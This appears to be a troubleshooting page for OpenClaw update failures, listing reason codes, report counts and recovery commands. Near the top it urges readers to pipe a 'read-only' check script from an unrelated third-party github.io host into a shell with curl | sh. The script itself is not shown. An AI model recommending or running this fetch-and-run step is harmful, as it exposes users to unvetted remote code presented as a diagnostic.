OpenClaw's Report update failure button files a public issue titled Update failure: <reason-code> (<version>). Since 2026-09-01 there have been 777 of them, 136 in the last 7 days. Updated 2026-10-09 15:20 UTC.

One thing most people miss: if you're on 2026.9.3 or 2026.9.4, several failures live in the updater you already have installed, so retrying openclaw update won't fix them. The docs' answer is to do the manual package-manager update once. The maintainer's exact recipe (#165706): npm install -g openclaw@2026.9.8 --allow-scripts=openclaw, then openclaw doctor --fix, then openclaw gateway restart. Back up first with openclaw backup create --verify.

Not sure which code you hit? Run curl -fsSL https://swarm-t3.github.io/safebump/check.sh | sh. It's read-only, and it reads openclaw update status --json and links you to the right page.

global-install-failed: 145 reports, 86 still open

What it means: The package manager's install, staging, verification or launcher swap exited with an error, and the updater then tried to roll back.

What to do: Check the report's Rollback outcome line, then run openclaw update status and openclaw gateway status --deep to confirm what is actually serving. The docs name two causes that live in the 2026.9.3 and 2026.9.4 updaters themselves (a launcher-permission mismatch on macOS, and a 30-second baseline timeout on busy hosts or slow disks). A newer release can't fix an updater that's already installed, so use the manual npm/pnpm/bun procedure once. Back up first, then stop the Gateway, install, run Doctor, and restart.

runtime-verification-failed: 97 reports, 49 still open

What it means: The new version installed, but its runtime check (often the candidate Gateway canary) didn't pass before the deadline.

plugin-target-unavailable: 69 reports, 0 still open

What it means: An enabled npm plugin has no version that resolves for the new core, or its registry metadata couldn't be read. The update refuses before it changes anything.

What to do: Retry later, pin the core with openclaw update --tag <older-version>, or disable that plugin and retry. Older updaters can refuse before the new code runs. In that case, use the manual method and then openclaw update repair.

finalize:doctor: 41 reports, 2 still open

What it means: The new version installed, but the post-update Doctor pass failed, or couldn't enter maintenance because a running Gateway still owns the state directory. database-schema-preflight: 22 reports, 18 still open

What it means: The updater refused because a database or config schema check failed before staging. One case where refusing is correct: the state was already written by a newer build (a nightly, a main checkout, or a downgrade). Then the supported path is to run a build at least as new as the one that last wrote the database.

What to do: Before you retry (a retry overwrites the history), run openclaw update status --json and read lastRun.origin.nextAction. Fix the configuration it names first, because a newer release can't repair an updater that refuses before staging.
